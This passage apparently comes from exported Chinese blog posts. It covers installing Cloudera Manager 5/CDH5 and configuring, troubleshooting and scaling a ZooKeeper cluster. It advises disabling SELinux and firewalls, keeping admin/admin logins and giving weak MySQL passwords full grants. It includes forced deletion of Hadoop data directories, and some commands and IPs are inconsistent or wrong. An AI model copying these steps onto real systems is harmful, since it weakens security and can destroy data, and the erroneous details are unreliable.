datanode10.jollychic.com关闭SELinux[root@cdm ~]# setenforce 0[root@cdm ~]# getenforceDisabled 下载安装： 12345678910111213141516171819202122232425单击下载 Cloudera Express 或则 Download Cloudera Enterprise. 查看 Cloudera Express and Cloudera Enterprise Features.选择注册和单击Submit 或则直接单击下载页链接（ download page），下载 cloudera-manager-installer.bin文件Pre-requisites: multiple, Internet-connected Linux machines, with SSH access, and significant free space in /var and /opt.1. 下载cloudera-manager-installer.bin$ wget http://archive.cloudera.com/cm5/installer/latest/cloudera-manager-installer.bin2.改变 cloudera-manager-installer.bin 的执行权限$ chmod u+x cloudera-manager-installer.bin复制代码3.执行 cloudera-manager-installer.bin$ sudo ./cloudera-manager-installer.bin复制代码4.按照cloudera-manager的README 来安装5.阅读Cloudera Manager Express License，然后按照提示选择YES来确定接受授权（license）6.读取 Oracle 二进制 Code 授权许可协议，然后安装 7.当安装完成，Cloudera Manager 管理控制台会提供一个完成的url包括默认端口7180我这种方法是在线安装方式，就说直接用.bin让系统自动下载需要的jdk和cm管理包。 如果网络差建议用离线安装方式。 先在本地搭建一个Creating a Local Yum Repository:下载独立的包路径：cm need package 安装完成以后服务也启动。 这里显示安装成功，访问地址，如果离线安装不到这一步不能操作，会提示报错指示。先手动下载好包rpm安装上即可。 安装目录详情：1234默认安装目录：/opt/cloudera日志目录：/var/log/cloudera-scm-server启动服务：[root@yancy cloudera-scm-server]# /etc/init.d/cloudera-scm-server statuscloudera-scm-server (pid 2723) 正在运行... 查看启动进程端口：12345678[root@cdm opt]# netstat -ntulp | grep javatcp 0 0 0.0.0.0:7180 0.0.0.0:* LISTEN 25780/javatcp 0 0 0.0.0.0:7182 0.0.0.0:* LISTEN 25780/java 访问地址：http://cdm.jollychic.com:7180 登录Cloudera Manager Admin 控制Username: admin Password: admin. 使用Cloudera Manager 向导安装和配置软件cloudera首页： 1. 添加服务器集群：在集群主机上安装和配置Cloudera Manager ，CDH，和管理服务软件包括以下三个主要步骤选择 Cloudera Manager 版本 和指定主机 2. 选择免费版，add继续 3. 显示的是安装Cloudera Manager后面可以安装的服务的软件包 4. 这里需要说明的是指定主机安装有多种方式：1231.直接列出ip或则host，多台以逗号、分号、制表符、空格或放置在单独的行。2.指定ip的地址范围例如：10.1.1.[1-4] 或则 host[1-3].hadoop.com.3.记得指定的主机需要关闭防火墙，（如果遇到不能安装，最好使用安装cloudera manager虚拟机进行复制）选择需要安装的Hadoop datanode服务器：这里我们线上访问端口不是22是58958 显示如下图说明机器通信没问题。 5. 安装CDH选择安装方式当我们选择安装的host之后，我们需要选择CDH的安装方式（方法），如下图所示 6. 这里点击安装Java工具包 7. 这里把需要安装的Hadoop服务器root密码设置一样，或者使用其他用户也可以，只要有sudo权限都可以。 8.安装这里如果提示出现报错：查看好文 Cloudera Manager5 在线bin安装遇到 无法检测到 Agent 发出的检测信号 总结12345这里只需要卸载：yum remove cloudera-manager-agent 如果想重新安装可以卸载所有：yum remove cloudera-manager-repository cloudera-manager-agent cloudera-manager-daemons cloudera-manager-server-db cloudera-manager-server -y 9.集群安装图1 这是一个很漫长的过程，不幸的是在下载完毕，执行分发的时候，这个过程被打断，安装被终止。导致回不到图2，这个该如何解决？ 难道真的要重装吗？花费了大半天功夫，又不得不重来。这里面的问题是找不到cloudera manager5所管理的节点了？ 记得about云有这篇文章卸载 Cloudera Manager 5.1.x.和 相关软件【官网翻译：高可用】但是这篇文章是卸载Cloudera Manager以及CDH的，由于cloudera-scm-server和cloudera-scm-agent查看都是运行正常的，如何查看状态，可以参考： Cloudera Manager Server5及Cloudera Manager Agents5命令整理（about云），所以cloudera manager不需要卸载，卸载的是CDH的相关内容。于是执行下面命令： 123456789sudo apt-update remove avro-tools crunch flume-ng hadoop-hdfs-fuse hadoop-hdfs-nfs3 hadoop-httpfs hbase-solr hive-hbase hive-webhcat hue-beeswax hue-hbase hue-impala hue-pig hue-plugins hue-rdbms hue-search hue-spark hue-sqoop hue-zookeeper impala impala-shell kite llama mahout oozie pig pig-udf-datafu search sentry solr-mapreduce spark-python sqoop sqoop2 whirr复制代码sudo apt-get clean复制代码sudo rm -Rf /var/lib/flume-ng /var/lib/hadoop* /var/lib/hue /var/lib/navigator /var/lib/oozie /var/lib/solr /var/lib/sqoop* /var/lib/zookeeper复制代码sudo rm -Rf /dfs /mapred /yarn复制代码通过上面终于找到所管理的三个节点。然后从新登录，选择三个主机，然后继续继续，最后终于进入了这个界面。但是细心的同学会发现这里已经更换为中文版本。因为这是通过宿主主机访问的。而前面是在虚拟机里使用firefox访问的。 成功到这一步：集群安装 10.选择集群设置 10.1 集群设置：自定义角色分配设置好角色分配查看主机： 11. 数据库设置 ✨✨ 这里使用默认设置，填写MySQL服务器IP，给予MySQL 用户名和密码all权限，不然会提示权限不足。 1234567891011121314151617Create the Oozie Database and Oozie MySQL UserFor example, using the MySQL mysql command-line tool:$ mysql -u root -pEnter password:mysql&gt; create database oozie default character set utf8;Query OK, 1 row affected (0.00 sec)mysql&gt; grant all privileges on oozie.* to 'oozie'@'localhost' identified by 'oozie';Query OK, 0 rows affected (0.00 sec)mysql&gt; grant all privileges on oozie.* to 'oozie'@'%' identified by 'oozie';Query OK, 0 rows affected (0.00 sec)mysql&gt; exitBye 选择然后单击测试连接即可。 测试 Activity Monitor 的数据库连接JDBC driver cannot be found. Unable to find the JDBC database jar on host : wlj-cdm. 1234567891011121314151617如果出现需要MySQL驱动,下载对应版本驱动，copy到相应目录/usr/share/java/ 统一去掉版本号.参考Installing the MySQL JDBC Driver官网文档：https://www.cloudera.com/documentation/enterprise/latest/topics/cm_ig_mysql.html#### Installing the MySQL JDBC Driver Download the MySQL JDBC driver from http://www.mysql.com/downloads/connector/j/5.1.html.Extract the JDBC driver JAR file from the downloaded file. For example:### $ wget https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.44.tar.gz### $ tar zxvf mysql-connector-java-5.1.31.tar.gzCopy the JDBC driver, renamed, to the relevant host. For example:### $ sudo cp mysql-connector-java-5.1.31/mysql-connector-java-5.1.31-bin.jar /usr/share/java/mysql-connector-java.jarIf the target directory does not yet exist on this host, you can create it before copying the JAR file. For example:### $ sudo mkdir -p /usr/share/java/### $ sudo cp mysql-connector-java-5.1.31/mysql-connector-java-5.1.31-bin.jar /usr/share/java/mysql-connector-java.jar 12. 审核更改(这里选择默认路径)等待安装： 13. 安装成功 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/07/29/Bigdata-hadoop/countly/Cloudera Manager5及CDH5安装指导/"},{"title":"Bigdata-ZooKeeper的配置详解优化","text":"前言ZooKeeper的功能特性通过 ZooKeeper 配置文件来进行控制管理（ zoo.cfg 配置文件）。 ZooKeeper 这样的设计其实是有它自身的原因的。通过前面对 ZooKeeper 的配置可以看出，对 ZooKeeper集群进行配置的时候，它的配置文档是完全相同的（对于集群伪分布模式来说，只有很少的部分是不同的）。这样的配置方使得在部署 ZooKeeper 服务的时候非常地方便。另外，如果服务器使用不同的配置文件，必须要确保不同配置文件中的服务器列表相匹配。 在设置 ZooKeeper 配置文档的时候，某些参数是可选的，但是某些参数是必须的。这些必须的参数就构成了ZooKeeper 配置文档的最低配置要求。 最近发现在用zookeeper出现经常出现连接超时，出现连接中断，数据丢失等原因。后面看了官网配置自己整理优化几点：12345678910111213141516171819202122232425262.1错误日志：2016-04-11 15:00:58,981 [myid:] - WARN [SyncThread:0:FileTxnLog@334] - fsync-ing the write ahead log in SyncThread:0 took 13973ms which will adversely effect operation latency. See the ZooKeeper troubleshooting guide&gt;2.2，错误原因分析“FOLLOWER”在跟“LEADER”同步时，fsync操作时间过长，导致超时。第一步：分析服务器问题：我查看了服务器io和负载都不高。内存空间实际使用率不高。可是编辑文件出现了卡顿.可以发现：服务器并没有占用很多内存的进程；服务器也没有存在很多的进程；cat /var/log/message查看系统日志并没有发现什么异常；另外ping服务器只有0.1ms多的延迟，因此不是网络问题。后面发现硬盘有故障重新更换了一块硬盘。或者更换服务器。&gt;2.3，错误解决增加“tickTime”或者“initLimit和syncLimit”的值，或者两者都增大。&gt;2.4，其他这个错误在上线“使用ZooKeeper获取地址方案”之前也存在，只不过过没有这么高频率，而上线了“ZooKeeper获取地址方案”之后，ZooKeeper Server之间的同步数据量增大，ZooKeeper Server的负载加重，因而最终导致高频率出现上述错误。 下面是在最低配置要求中必须配置的参数：1234567891011121314151617### 最小配置最小配置意味着所有的配置文件中必须要包含这些配置选项。#### clientPort服务器监听客户端连接的端口, 亦即客户端尝试连接到服务器上的指定端口。##### dataDirZooKeeper 存储内存数据库快照文件的路径, 并且如果没有指定其它路径的话, 数据库更新的事务日志也将存储到该路径下。注意: 事务日志会影响 ZooKeeper 服务器的整体性能, 所以建议将事务日志放置到由 dataLogDir 参数指定的路径下。##### tickTime单个 tick 的时间长度, 它是 ZooKeeper 中使用的基本时间单元, 以毫秒为单位。它用来调节心跳和超时时间。例如, 最小会话超时时间是 2 个 tick。 生产环境配置例子：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849501.tickTime：CS通信心跳数Zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个 tickTime 时间就会发送一个心跳。tickTime以毫秒为单位。tickTime=2000 2.initLimit：LF初始通信时限集群中的follower服务器(F)与leader服务器(L)之间初始连接时能容忍的最多心跳数（tickTime的数量）。initLimit=5 3.syncLimit：LF同步通信时限集群中的follower服务器与leader服务器之间请求和应答之间能容忍的最多心跳数（tickTime的数量）。syncLimit=2 4.dataDir：数据文件目录Zookeeper保存数据的目录，默认情况下，Zookeeper将写数据的日志文件也保存在这个目录里。dataDir=/data/tools/zookeeper/data5.dataLogDir：日志文件目录Zookeeper保存日志文件的目录。dataLogDir=/data/tools/zookeeper/log 6.clientPort：客户端连接端口客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。clientPort=2333 7.服务器名称与地址：集群信息（服务器编号，服务器地址，LF通信端口，选举端口）这个配置项的书写格式比较特殊，规则如下：server.N=YYY:A:B 其中N表示服务器编号，YYY表示服务器的IP地址，A为LF通信端口，表示该服务器与集群中的leader交换的信息的端口。B为选举端口，表示选举新leader时服务器间相互通信的端口（当leader挂掉时，其余服务器会相互通信，选择出新的leader）。一般来说，集群中每个服务器的A端口都是一样，每个服务器的B端口也是一样。但是当所采用的为伪集群时，IP地址都一样，只能时A端口和B端口不一样。下面是一个非伪集群的例子：server.0=233.34.9.144:2008:6008 server.1=233.34.9.145:2008:6008 server.2=233.34.9.146:2008:6008 server.3=233.34.9.147:2008:6008 下面是一个伪集群的例子：server.0=127.0.0.1:2008:6008 server.1=127.0.0.1:2007:6007 server.2=127.0.0.1:2006:6006 server.3=127.0.0.1:2005:6005 高级配置 (官网翻译)本节的配置选项是可选的。你可以使用它们进一步的优化 ZooKeeper 服务器的行为。有些可以使用 Java 系统属性来设置, 一般的格式是 “zookeeper.keyword”。如果有具体的系统属性, 会在配置选项下面标注出来。 dataLogDir没有对应的 Java 系统属性。 该参数用于配置 ZooKeeper 服务器存储事务日志文件的路径, ZooKeeper 默认将事务日志文件和数据快照存储在同一个目录下, 应尽量将它们分开存储。 注意: 将事务日志文件存储到一个专门的日志设备上对于服务器的吞吐量和稳定的延迟有很大的影响。事务日志对磁盘性能要求比较高, 为了保证数据一致性, ZooKeeper 在响应客户端事务请求之前, 需要将请求的事务日志写到磁盘上, 所以事务日志的写入性能直接影响 ZooKeeper 服务器处理请求的吞吐。所以建议给事务日志的输出配置一个单独的磁盘或者挂载点。 globalOutstandingLimit对应的 Java 系统属性: zookeeper.globalOutstandingLimit。 客户端提交请求的速度可能比 ZooKeeper 处理的速度快得多, 特别是当客户端的数量非常多的时候。为了防止 ZooKeeper 因为排队的请求而耗尽内存, ZooKeeper 将会对客户端进行限流, 即限制系统中未处理的请求数量不超过 globalOutstandingLimit 设置的值。默认的限制是 1,000。 preAllocSize对应的 Java 系统属性: zookeeper.preAllocSize。 用于配置 ZooKeeper 事务日志文件预分配的磁盘空间大小。默认的块大小是 64M。改变块大小的其中一个原因是当数据快照文件生成比较频繁时可以适当减少块大小。比如 1000 次事务会新产生一个快照(参数为snapCount), 新产生快照后会用新的事务日志文件, 假设一个事务信息大小100b, 那么事务日志预分配的磁盘空间大小为100kb会比较好。 snapCount对应的 Java 系统属性: zookeeper.snapCount。 ZooKeeper 将事务记录到事务日志中。当 snapCount 个事务被写到一个日志文件后, 启动一个快照并创建一个新的事务日志文件。snapCount 的默认值是 100,000。 traceFile对应的 Java 系统属性: requestTraceFile。 如果定义了该选项, 那么请求将会记录到一个名为 traceFile.year.month.day 的跟踪文件中。使用该选项可以提供很有用的调试信息, 但是会影响性能。 注意: requestTraceFile 这个系统属性没有 zookeeper 前缀, 并且配置的变量名称和系统属性不一样。 maxClientCnxns没有对应的 Java 系统属性 在 socket 级别限制单个客户端到 ZooKeeper 集群中单台服务器的并发连接数量, 可以通过 IP 地址来区分不同的客户端。它用来阻止某种类型的 DoS 攻击, 包括文件描述符资源耗尽。默认值是 60。将值设置为 0 将完全移除并发连接的限制。 clientPortAddress服务器监听客户端连接的地址 (ipv4, ipv6 或 主机名) , 亦即客户端尝试连接到服务器上的地址。该参数是可选的, 默认我们以这样一种方式绑定, 即对于服务器上任意 address/interface/nic, 任何连接到 clientPort 的请求将会被接受。 minSessionTimeout没有对应的 Java 系统属性 服务器允许客户端会话的最小超时时间, 以毫秒为单位。默认值是 2 倍的 tickTime。 maxSessionTimeout没有对应的 Java 系统属性 服务器允许客户端会话的最大超时时间, 以毫秒为单位。默认值是 20 倍的 tickTime。 fsync.warningthresholdms对应的 Java 系统属性: fsync.warningthresholdms。 用于配置 ZooKeeper 进行事务日志 (WAL) fsync 操作消耗时间的报警阈值, 一旦超过这个阈值将会打印输出报警日志。该参数的默认值是 1000, 以毫秒为单位。参数值只能作为系统属性来设置。 autopurge.snapRetainCount没有对应的 Java 系统属性。 当启用自动清理功能后, ZooKeeper 将只保留 autopurge.snapRetainCount 个最近的数据快照(dataDir)和对应的事务日志文件(dataLogDir), 其余的将会删除掉。默认值是 3。最小值也是 3。 autopurge.purgeInterval没有对应的 Java 系统属性。 用于配置触发清理任务的时间间隔, 以小时为单位。要启用自动清理, 可以将其值设置为一个正整数 (大于 1) 。默认值是 0。 syncEnabled对应的 Java 系统属性: zookeeper.observer.syncEnabled。 和参与者一样, 观察者现在默认将事务日志以及数据快照写到磁盘上, 这将减少观察者在服务器重启时的恢复时间。将其值设置为 “false” 可以禁用该特性。默认值是 “true”。 集群配置选项 本节中的选项主要用于ZooKeeper集群。 electionAlg没有对应的 Java 系统属性。 用于选择使用的 leader 选举算法。”0” 对应于原始的基于 UDP 的版本, “1” 对应于快速 leader 选举基于UDP的无身份验证的版本, “2” 对应于快速 leader 选举有基于UDP的身份验证的版本, 而 “3” 对应于快速 leader 选举基于TCP的版本。目前默认值是算法 3。 注意: leader 选举 0, 1, 2 这三种实现已经废弃, 在接下来的版本中将会移除它们, 这样就只剩下 FastLeaderElection 算法。 initLimit没有对应的 Java 系统属性。 默认值是 10, 即 tickTime 属性值的 10 倍。它用于配置允许 followers 连接并同步到 leader 的最大时间。如果 ZooKeeper 管理的数据量很大的话可以增加这个值。 leaderServes对应的 Java 系统属性: zookeeper.leaderServes。 用于配置 Leader 是否接受客户端连接, 默认值是 “yes”, 即 leader 将会接受客户端连接。在 ZooKeeper 中, leader 服务器主要协调事务更新请求。对于事务更新请求吞吐很高而读取请求吞吐很低的情况可以配置 leader 不接受客户端连接, 这样就可以专注于协调工作。 注意: 当 ZooKeeper 集群中服务器的数量超过 3 个时, 建议开启 leader 选举。 server.x=[hostname]:nnnnn:nnnnn没有对应的 Java 系统属性。 组成 ZooKeeper 集群的服务器。当服务器启动时, 可以通过查找数据目录中的 myid 文件来决定它是哪一台服务器。myid 文件包含服务器编号, 并且它要匹配 “server.x” 中的 x。 客户端用来组成 ZooKeeper 集群的服务器列表必须和每个 ZooKeeper 服务器中配置的 ZooKeeper 服务器列表相匹配。 有两个端口号 nnnnn, 第一个是 followers 用来连接到 leader, 第二个是用于 leader 选举。如果想在单台机器上测试多个服务, 则可以为每个服务配置不同的端口。 syncLimit没有对应的 Java 系统属性。 默认值是 5, 即 tickTime 属性值的 5 倍。它用于配置leader 和 followers 间进行心跳检测的最大延迟时间。如果在设置的时间内 followers 无法与 leader 进行通信, 那么 followers 将会被丢弃。 group.x=nnnnn[:nnnnn]没有对应的 Java 系统属性。 Enables a hierarchical quorum construction.”x” 是一个组的标识, 等号右边的数字对应于服务器的标识. 赋值操作右边是冒号分隔的服务器标识。注意: 组必须是不相交的, 并且所有组联合后必须是 ZooKeeper 集群。 weight.x=nnnnn没有对应的 Java 系统属性。 和 “group” 一起使用, 当形成集群时它给每个服务器赋权重值。这个值对应于投票时服务器的权重。ZooKeeper 中只有少数部分需要投票, 比如 leader 选举以及原子的广播协议。服务器权重的默认值是 1。如果配置文件中定义了组, 但是没有权重, 那么所有服务器的权重将会赋值为 1。 cnxTimeout对应的 Java 系统属性: zookeeper.cnxTimeout。 用于配置 leader选举过程中，打开一次连接（选举的 server 互相通信建立连接）的超时时间。默认值是 5s。 身份认证和授权选项本节的选项允许通过身份认证和授权来控制服务执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647zookeeper.DigestAuthenticationProvider.superDigest对应的 Java 系统属性: zookeeper.DigestAuthenticationProvider.superDigest该功能默认是禁用的。能够使 ZooKeeper 集群管理员可以作为一个 \"super\" 用户来访问 znode 层级结构。特别是对于一个已经认证为超级管理员的用户不需要 ACL 检查。org.apache.zookeeper.server.auth.DigestAuthenticationProvider 可以用来生成 superDigest, 调用它带有 \"super:&lt;password&gt;\" 参数的方法。当启动集群中的每台服务器时, 将生成的 \"super:&lt;data&gt;\" 作为系统属性提供。当 ZooKeeper 客户端向 ZooKeeper 服务器进行身份认证时, 会传递一个 \"digest\" 和 \"super:&lt;password&gt;\" 的认证数据. 注意摘要式身份验证将认证数据以普通文本的形式传递给服务器, 在网络中需要谨慎使用该认证方法, 要么只在本机上或通过一个加密的连接。### 实验性选项/特性本节列举了一些目前还处于实验阶段的新特性。### 服务器只读模式对应的 Java 系统属性: readonlymode.enabled。将其设置为 true 将会启用服务器只读模式支持, 默认是禁用的。ROM 允许请求了 ROM 支持的客户端会话连接到服务器, 即使当服务器可能已经从集群中分隔出去。在该模式中, ROM 客户端仍然可以从 ZK 服务中读取值, 但是不能进行写操作以及看见其它客户端所做的一些变更。更多详细信息可以参见 ZOOKEEPER-784 获取更多详细信息。### 不安全的选项下面的选项会很有用, 但是使用的时候需要特别小心。### forceSync对应的 Java 系统属性: zookeeper.forceSync。用于配置是否需要在事务日志提交的时候调用 FileChannel.force 来保证数据完全同步到磁盘。默认值是 \"yes\"。如果该选项设置为 \"no\", ZooKeeper 将不会强制同步事务更新日志到磁盘。### jute.maxbuffer:对应的 Java 系统属性: jute.maxbuffer。没有 zookeeper 前缀。用于指定一个 znode 中可以存储数据量的最大值, 默认值是 0xfffff, 或 1M 内。如果这个选项改变了, 那么该系统属性必须在所有的服务端和客户端进行设置, 否则会出现问题。ZooKeeper旨在存储大小为千字节数量的数据。### skipACL对应的 Java 系统属性: zookeeper.skipACL。用于配置 ZooKeeper 服务器跳过 ACL 权限检查。这将一定程度的提高服务器吞吐量, 但是也向所有客户端完全开放数据访问。### quorumListenOnAllIPs当设置为 true 时, ZooKeeper 服务器将会在所有可用的 IP 地址上监听来自其对等点的连接请求, 而不仅是配置文件的服务器列表中配置的地址。它会影响处理 ZAB 协议和 Fast Leader Election 协议的连接。默认值是 false。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/05/27/Bigdata-hadoop/zookeeper/Bigdata-ZooKeeper的配置详解优化/"},{"title":"Bigdata-ZooKeeper集群快速搭建配置与扩容","text":"ZooKeeper集群快速搭建之前搞过了hadoop和spark，hue，现在使用kafka集群结合zookeeper集群做数据消费处理，本文是ZooKeeper的快速搭建,旨在帮助大家以最快的速度完成一个ZK集群的搭建,以便开展其它工作。 集群：本文使用了3台机器部署ZooKeeper集群，IP和主机名对应关系如下： 1234IP 主机名169.44.62.11 zk1.jollychic.com 169.44.59.12 zk2.jollychic.com169.44.62.13 zk3.jollychic.com 安装说明Zookeeper机器间不需要设置免密码登录，其它hadoop也可以不设置，只要不使用hadoop-daemons.sh来启动、停止进程，注意不是hadoop-daemon.sh，而是带“s”的那个，带“s”的会读取hadoop的salves文件，远程ssh启动DataNode和备NameNode等。 配置/etc/hosts将3台机器的IP和主机名映射关系，在3台机器上都配置一下，亦即在3台机器的/etc/hosts文件中，均增加以下内容（可以先配置好一台，然后通过scp等命令复制到其它机器上，注意主机名不能包含任何下划线）： 1234127.0.0.1 localhost.localdomain localhost169.44.62.12 zk1.jollychic.com169.44.59.13 zk2.jollychic.com169.44.62.14 zk3.jollychic.com Step1:配置JAVA环境。检验方法:执行 java –version 和 javac –version 命令。下载并解压 zookeeper。链接一 ，链接二 (更多版本:http://dwz.cn/37HGI) Step2:12345671.zookeeper的环境变量的配置：为了今后操作方便，我们需要对Zookeeper的环境变量进行配置，方法如下：在/etc/profile.d/zk.sh文件中加入如下的内容：#set zookeeper environmentexport ZOOKEEPER_HOME=/data/tools/zookeeper-3.4.5export PATH=$PATH:$ZOOKEEPER_HOME/bin:$ZOOKEEPER_HOME/conf Step3:12345678910112.下载以后解压到我自己新建的：[hadoop@namenode ~]$ tar -zxvf zookeeper-3.3.6.tar.gz -C /srv/hadoop/[hadoop@namenode ]$ cd /srv/hadoop/zookeeper-3.3.6/conf/### 将zoo_sample.cfg拷贝一份命名为zoo.cfg,这里我拷贝一份命名为：zoo.cfg[hadoop@namenode conf]$ cp -r zoo_sample.cfg zoo.cfg### 这里先创建/data和/logs 这两个目录。mkdir -p /data/tools/zookeeper-3.4.5/zookeeper/datamkdir -p /data/tools/zookeeper-3.4.5/zookeeper/logs 注意上图的配置中master，slave1分别为主机名。 在上面的配置文件中&quot;server.id=host:port:port&quot;中的第一个port是从机器（follower）连接到主机器（leader）的端口号，第二个port是进行leadership选举的端口号。 修改配置：zoo.cfg修改有的默认存在，添加红色的内容： 1234567891011tickTime=2000clientPort=2181initLimit=10syncLimit=5maxClientCnxns=0 #这个是设置连接数0没有做限制dataDir=/data/tools/zookeeper-3.4.5/zookeeper/datadataLogDir=/data/tools/zookeeper-3.4.5/zookeeper/logsserver.0=zk1.jollychic.com:2888:3888server.1=zk2.jollychic.com:2888:3888server.2=zk3.jollychic.com:2888:3888 创建maid:这里所有节点都需要创建，接下来在dataDir所指定的目录下创建一个文件名为myid的文件，文件中的内容只有一行，为本主机对应的id值，也就是上图中server.id中的id。例如：在服务器1中的myid的内容应该写入1。创建myid：在zoo.cfg配置文件中的dataDir的目录下面创建myid，每个节点myid要求不一样： 12vim /data/tools/zookeeper-3.4.5/tmp/myid 0 Step4:远程复制分发安装文件。最好是把文件打包scp过去。接下来将上面的安装文件拷贝到集群中的其他机器上对应的目录下: 12345scp -P58958 -r zookeeper-3.4.5 jollybi@169.44.62.137:/data/tools/. scp -P58958 -r zookeeper-3.4.5 jollybi@169.44.59.138:/data/tools/. 拷贝完成后修改对应的机器上的myid。例如修改其他两台机器中的myid如下：echo 1 &gt; /data/tools/zookeeper-3.4.5/tmp/myid echo 2 &gt; /data/tools/zookeeper-3.4.5/tmp/myid Step5:启动 ZooKeeper集群在ZooKeeper集群的每个结点上，执行启动ZooKeeper服务的脚本，如下所示： 123456789在ZooKeeper集群的每个结点上，执行启动ZooKeeper服务的脚本，如下所示：[jollybi@zk1.jollychic.com ~]$ /data/tools/zookeeper-3.4.5/bin/zkServer.sh start [jollybi@zk1.jollychic.com ~]$ /data/tools/zookeeper-3.4.5/bin/zkServer.sh start [jollybi@zk1.jollychic.com ~]$ /data/tools/zookeeper-3.4.5/bin/zkServer.sh start [jollybi@zk1.jollychic.com ~]$ jps123189 QuorumPeerMain123309 Kafka1151 Jps 执行 1/haozhuo/hadoop/zookeeper-3.4.5/bin/zkServer.sh start Step6:检测是否成功启动:执行 jps 124933 QuorumPeerMain 其中，QuorumPeerMain是zookeeper进程，启动正常。 ./zkServer.sh status 查看当前运行状态。 namenode1 1234567891011121314[jollybi@zk1.jollychic.com zookeeper-3.4.5]# ./zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.4.5/bin/../conf/zoo.cfgMode: follower[jollybi@zk1.jollychic.com zookeeper-3.4.5]# ./bin/zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.4.5/bin/../conf/zoo.cfgMode: leader[jollybi@zk1.jollychic.com zookeeper-3.4.5]# ./bin/zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.4.5/bin/../conf/zoo.cfgMode: leader 链接测试123bin/zkCli.sh -server 127.0.0.1:2181bin/zkCli.sh -server 127.0.0.1:2181bin/zkCli.sh -server 127.0.0.1:2181 Step7:如果单台可以其他几台不行，看配置，如果没有问题。启动查看状态出现异常。 异常解决:Error contacting service. It is probably not running. 12345而其他一个节点却是现实正常;先stop掉原zk./bin/zkServer.sh stop然后以start-foreground方式启动，会看到启动日志./bin/zkServer.sh start 当出现问题的时候，记得查看日志zookeeper.out，在你配置的dataDir（在conf/zoo.cfg中查看）目录下。 1232015-12-29 11:09:38,034 [myid:1] - WARN [WorkerSender[myid=1]:QuorumCnxManager@400] - Cannot open channel to 3 at election address Node2/10.0.0.102:38888java.net.ConnectException: 拒绝连接at java.net.PlainSocketImpl.socketConnect(Native Method) 可以看到是连接到Node2的3888端口不通（我配置文件设置的节点端口，server.3=Node2:2888:3888），这样就找到问题了，所以当遇到问题的时候记得查看日志文件，这才是最有帮助的，而不是修改什么nc参数。 这里主要看下是否加入hosts 查看Node2节点发现，38888端口绑带到127.0.0.1上了，这让Master节点怎么连接呀，只需修改/etc/hosts文件即可，同理，修改Node1，然后重启zookeeper，发现问题解决。 12345127.0.0.1 localhost zk1.jollychic.com::1 localhost localhost.localdomain localhost6 localhost6.localdomain6169.44.62.12 zk1.jollychic.com169.44.59.13 zk2.jollychic.com169.44.62.14 zk3.jollychic.com 这里我127.0.0.1 localhost zk1.jollychic.com 就可以了。 Step8: 如何扩容zookeeper？只需要将已有的zookeeper打包复制到新的机器上，然后修改myid文件并设置好，然后启动zookeeper即可。 设置开机自动启动1.写个启动脚本放到/etc/rc.d/init.d/zookeeper这里touch zookeeper &amp;&amp; chmod +x zookeeper &amp;&amp; vim zookeeper 12345678910111213!/bin/bash#chkconfig:2345 20 90#description:zookeeper#processname:zookeeperexport JAVA_HOME=/srv/jdk1.8.0_66export PATH=$JAVA_HOME/bin:$PATHcase $1 in start) su root /srv/zookeeper-3.3.6/bin/zkServer.sh start;; stop) su root /srv/zookeeper-3.3.6/bin/zkServer.sh stop;; status) su root /srv/zookeeper-3.3.6/bin/zkServer.sh status;; restart) su root /srv/zookeeper-3.3.6/bin/zkServer.shrestart;; *) echo \"requirestart|stop|status|restart\";;esac 2.设置开机启动 1chkconfig zookeeper on 3.验证 12chkconfig --add zookeeperchkconfig --list zookeeper 这个时候我们就可以用service zookeeper start/stop来启动停止zookeeper服务了.使用chkconfig--add zookeeper命令把zookeeper添加到开机启动里面添加完成之后接这个使用chkconfig--list来看看我们添加的zookeeper是否在里面如果上面的操作都正常的话；重启服务器测试就行。 注意：zookeeper重启出现几种报错：1. 启动服务报错找不到指定好的pid文件。2. 关闭服务报错没有在/tmp/路径下面没有/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid 123456789101112[root@zookeeper zookeeper-3.3.6]# ./bin/zkServer.sh startJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStarting zookeeper ... ./bin/zkServer.sh: line 93: [: /tmp/zookeeper: binary operator expected./bin/zkServer.sh: line 103: /tmp/zookeeper/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid: 没有那个文件或目录FAILED TO WRITE PID[root@zookeeper zookeeper-3.3.6]# ./bin/zkServer.sh stopJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStopping zookeeper ... no zookeeper to stop (could not find file /tmp/zookeeper/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid) 解决方法：网上很少有人讲这么详细，这里我就说下，就是你在修改zoo.cfg配置文件里面： dataDir指定的路径是自定义的话等于的时候不要空格写。 如果重新另外写dataDir ,不要注释掉之前的，最好直接删除，重新指定这样就不会报错了，如果注释掉默认的#dataDir = /tmp这里需要空格。 Step9.报错占用端口：123JMX enabled by defaultUsing config: /opt/app/zookeeper/bin/../conf/zoo3.cfgStarting zookeeper ... STARTED 查看状态：用jps命令查看进程： 1234567# jps24617 QuorumPeerMain （这个就是zookeeper进程）/opt/app/zookeeper/bin/zkServer.sh status zoo1.cfgJMX enabled by defaultUsing config: /opt/app/zookeeper/bin/../conf/zoo1.cfgError contacting service. It is probably not running. Ihaozhuo_b3314说明有错误，查看日志文件： 12345# cd &lt;zookeeper_home&gt;# less zookeeper.outjava.net.BindException: 地址已在使用杀掉当前进程：# kill -9 24617 报错: 启动服务正常。1234[root@api1 zookeeper-3.3.6]# ./bin/zkServer.sh startJMX enabled by defaultUsing 